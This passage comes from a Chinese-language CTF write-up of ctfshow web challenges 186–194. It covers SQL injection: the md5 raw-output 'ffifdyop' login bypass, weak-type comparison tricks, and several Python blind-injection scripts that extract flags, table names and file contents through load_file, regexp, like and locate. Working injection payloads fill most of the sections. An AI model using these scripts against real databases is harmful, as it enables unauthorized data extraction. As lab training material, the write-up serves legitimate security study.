class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="subst">&#123;createNum(i)&#125;</span>,<span class="subst">&#123;createNum(<span class="number">1</span>)&#125;</span>)regexp(char(<span class="subst">&#123;createNum(j)&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 43;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(flag.lower())</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(j) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407153242084.png" alt="image-20220407153242084"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407153406158.png" alt="image-20220407153406158"></p><h2 id="pwd的md5"><a href="#pwd的md5" class="headerlink" title="pwd的md5"></a>pwd的md5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(string,raw)     </span><br><span class="line">参数描述</span><br><span class="line">string必需。要计算的字符串。</span><br><span class="line">raw</span><br><span class="line">可选。</span><br><span class="line">    默认不写为FALSE。32位16进制的字符串</span><br><span class="line">    TRUE。16位原始二进制格式的字符串</span><br></pre></td></tr></table></figure><p> 这里需要注意的是，当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种。</p><p>上面的’ffifdyop‘字符串对应的16位原始二进制的字符串就是”    ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c    “  。  ‘  \  ‘后面的3个字符连同’  \  ‘算一个字符，比如’    \xc9    ‘，所以上述一共16个。当然，像’    \xc9    ‘这种字符会显示乱码。</p><p> 这里32位的16进制的字符串，两个一组就是上面的16位二进制的字符串。比如27，这是16进制的，先要转化为10进制的，就是39，39在ASC码表里面就是’    ‘    ‘字符。6f就是对应‘    o    ’。</p><pre><code>   然后我们得到的sql语句就是 SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&#39;or&#39;6�]��!r,��b&#39;   为什么password = &#39;&#39;or&#39;6�]��!r,��b&#39;的返回值会是true呢，因为or后面的单引号里面的字符串（6�]��!r,��b），是数字开头的。当然不能以0开头。（我不知道在数据库里面查询的时候，�这种会不会显示）   这里引用一篇文章，连接在下面，里面的原话“a string starting with a 1 is cast as an integer when used as a boolean.“  在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。   当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符） 所以到这里为止，就完成了sql注入。同时要注意的是，这种sql语句，在mysql里面是可以行得通的，但是在oracle数据库里面这样的语句是有语法错误的。   所以回过头来为什么ffifdyop就是答案，因为ffifdyop的md5的原始二进制字符串里面有‘or’6这一部分的字符。那么进一步思考这个单引号是否是必要的，这两个单引号是为了与原有的语句的单引号配对。所以我们理解了这个sql注入的原理，那么就明白了我们需要怎样的字符串。</code></pre><h1 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407153535740.png" alt="image-20220407153535740"></p><p>这条语句可以查出所有数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users where username = 1&lt;1 and password = 0</span><br><span class="line">SELECT * FROM users where username = 0 and password = 0</span><br></pre></td></tr></table></figure><p>在where username&#x3D;0这样的查询中,因为username都是字符串,在mysql中字符串与数字进行比较适合,以字母开头的字符串都会转换成数字0,因此这个where可以把所有以字母开头的数据查出来</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br></pre></td></tr></table></figure><p>这里的查询密码是弱类型,查出来的passwd也是以字母开头的,所以password&#x3D;0可以成功弱类型比较</p><p>这样也可以查到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from referers where referer = &#x27;http://127.0.0.1/sqlilabs/Less-19/&#x27; and referer = 1;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407154415679.png" alt="image-20220407154415679"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT password FROM users where username = 1||1 and password = 12;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407154509937.png" alt="image-20220407154509937"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&lt;1&amp;password=0</span><br><span class="line">username=0&amp;password=0</span><br><span class="line">username=1||1&amp;password=0</span><br></pre></td></tr></table></figure><h1 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407155009165.png" alt="image-20220407155009165"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407155019582.png" alt="image-20220407155019582"></p><h2 id="load-file-函数盲注文件"><a href="#load-file-函数盲注文件" class="headerlink" title="load_file()函数盲注文件"></a>load_file()函数盲注文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:feng</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://356200d4-1b3a-4eff-818f-9c21ccbf8214.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>:</span><br><span class="line">        payload=<span class="string">&quot;if((load_file(&#x27;/var/www/html/api/index.php&#x27;))regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(flag+j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Author：Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3d54cb5b-69e8-4592-85b3-662e3aa01ea5.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlagIndex</span>():</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">300</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(locate(&#x27;flag&#123;&#x27;,&quot;</span> + <span class="string">&quot;load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;0&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(mid)),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">return</span> mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">num</span>):</span><br><span class="line">    i = <span class="built_in">int</span>(num)</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),</span><br><span class="line">                                                                                                               <span class="built_in">str</span>(</span><br><span class="line">                                                                                                                   mid)),</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">            mid += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(head)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    index = getFlagIndex()</span><br><span class="line">    getFlag(index)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h1><h2 id="无过滤盲注"><a href="#无过滤盲注" class="headerlink" title="无过滤盲注"></a>无过滤盲注</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://87a2c8d4-69ca-4617-b96c-ce3601bdc1a6.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库 ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查字段 id,f1ag</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查flag</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;admin&#x27; and if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,2)=&#x27;1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span>  == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h1><h2 id="ord函数盲注"><a href="#ord函数盲注" class="headerlink" title="ord函数盲注"></a>ord函数盲注</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://646c4493-3a66-407e-8ddf-c59355418a23.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库 ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查字段 f1ag</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查flag</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;admin&#x27; and if(ord(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,2)=&#x27;1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span>  == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>爆破出来可能是大写的</p><p>主要还是一个地方，就是一般布尔注入都会用改成ascii码值进行比较，正常字符串的比较不也是挨个位置比较ascii码吗？为什么还要多费事的去加一层ascii，这个的原因就是mysql进行字符串比较的时候，是按大写比较的，比如”1ab2AAD”，比较的时候是”1AB2AAD”，所以才会加上那一层ascii，这题ascii被ban了，直接字符串比较的话肯定爆出来的都是大写了。</p><h1 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h1><h2 id="过滤ord和ascii函数"><a href="#过滤ord和ascii函数" class="headerlink" title="过滤ord和ascii函数"></a>过滤ord和ascii函数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:feng</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://00b9416c-a0a8-490b-b48b-b2ace6ec42b2.chall.ctf.show:8080/api/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    length=<span class="built_in">len</span>(flag)</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        j=<span class="built_in">min</span>+(<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span>==j:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag.lower())</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j)==<span class="string">&quot; &quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        payload=<span class="string">&quot;&#x27; or if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)&lt;&#x27;&#123;&#125;&#x27;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="comment">#print(r)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">max</span>=j</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">min</span>=j</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot; _&#123;&#125;-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h1><h2 id="过滤sustr"><a href="#过滤sustr" class="headerlink" title="过滤sustr"></a>过滤sustr</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:feng</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://fc1e9e65-4116-4635-aebc-05e37fef775f.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot;</span>:</span><br><span class="line">        <span class="comment">#payload=&quot;&#x27; or if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like &#x27;&#123;&#125;&#x27;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)</span></span><br><span class="line">        <span class="comment">#payload=&quot;&#x27; or if((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;) like &#x27;&#123;&#125;&#x27;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)</span></span><br><span class="line">        payload=<span class="string">&quot;&#x27; or if((select group_concat(f1ag) from ctfshow_flxg) like &#x27;&#123;&#125;&#x27;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(flag+j+<span class="string">&quot;%&quot;</span>)</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fc1e9e65-4116-4635-aebc-05e37fef775f.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查字段 f1ag</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;(select group_concat(f1ag) from ctfshow_fl0g)&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if((<span class="subst">&#123;payload&#125;</span>)regexp(&#x27;<span class="subst">&#123;flag +j&#125;</span>&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h1><h2 id="locat-正则注入"><a href="#locat-正则注入" class="headerlink" title="locat()正则注入"></a>locat()正则注入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE</span></span><br><span class="line">url = <span class="string">&quot;http://dee436de-268a-408e-b66a-88b4c972e5f5.chall.ctf.show/api/&quot;</span></span><br><span class="line">final = <span class="string">&quot;&quot;</span></span><br><span class="line">stttr = <span class="string">&quot;flag&#123;&#125;-_1234567890qwertyuiopsdhjkzxcvbnm&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> stttr:</span><br><span class="line">        final += j</span><br><span class="line">        <span class="comment"># 查表名-ctfshow_flxg</span></span><br><span class="line">        <span class="comment"># payload = f&quot;admin&#x27; and if(locate(&#x27;&#123;final&#125;&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1))=1,1,2)=&#x27;1&quot;</span></span><br><span class="line">        <span class="comment"># 查字段-f1ag</span></span><br><span class="line">        <span class="comment"># payload = f&quot;admin&#x27; and if(locate(&#x27;&#123;final&#125;&#x27;,(select column_name from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27; limit 1,1))=1,1,2)=&#x27;1&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(locate(&#x27;<span class="subst">&#123;final&#125;</span>&#x27;,(select f1ag from ctfshow_flxg limit 0,1))=1,1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(final)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            final = final[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td 